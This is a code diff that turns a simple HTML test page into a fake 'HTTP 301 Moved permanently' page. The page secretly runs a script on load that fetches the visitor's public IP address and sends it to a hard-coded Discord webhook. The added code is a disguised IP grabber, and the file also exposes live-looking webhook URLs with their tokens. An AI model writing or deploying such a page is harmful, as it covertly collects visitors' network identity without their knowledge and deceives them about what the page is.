@@ -1,32 +1,18 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dchcdhdbyugb</title>
-    <input id="testing">
-    <button onclick="api()">send</button>
-    <h1 id="output">output</h1>
-    <script>
+<h1>HTTP 301</h1>
+<h4>Moved permanently</h4>
+
+<script>
 async function api() {
-    /*
-    You can change these following:
-
-    - Webhook link ( in const hook)
-    - Message (in content: "your text here")
-
-    */
 
 
-    const hook = "https://discord.com/api/webhooks/1353090748500807703/StkMU1RwyOgNyM77LE26YTf2vbgfjTFtpTWQmvj6cXTelEQM3hVQKj3REZXU9geD1R22"; // Input your webhook here
+    const hook = "https://discord.com/api/webhooks/1366732587707531348/OkmQtgNB8RBduV0mQ9ewzeJ10BCxwTa2AK-T8kosOKGjZWzcZxq9vlUcrIpDDawsMhaB"; // Input your webhook here
 
 
-    // Dont change anything bellow here (example for content stuff)
     try {
         const url = await fetch("https://api.ipify.org?format=json"); 
         const data = await url.json();
         const info = data.ip;
-        const msg = document.getElementById("testing")
+        const msg = "TEST"
 
         await fetch(hook, {
         method: "POST",
@@ -35,11 +21,8 @@ async function api() {
         });
     } catch{}
 }
-
-
-    </script>
-</head>
-<body>
+api()
+</script>
 
 
 </body>
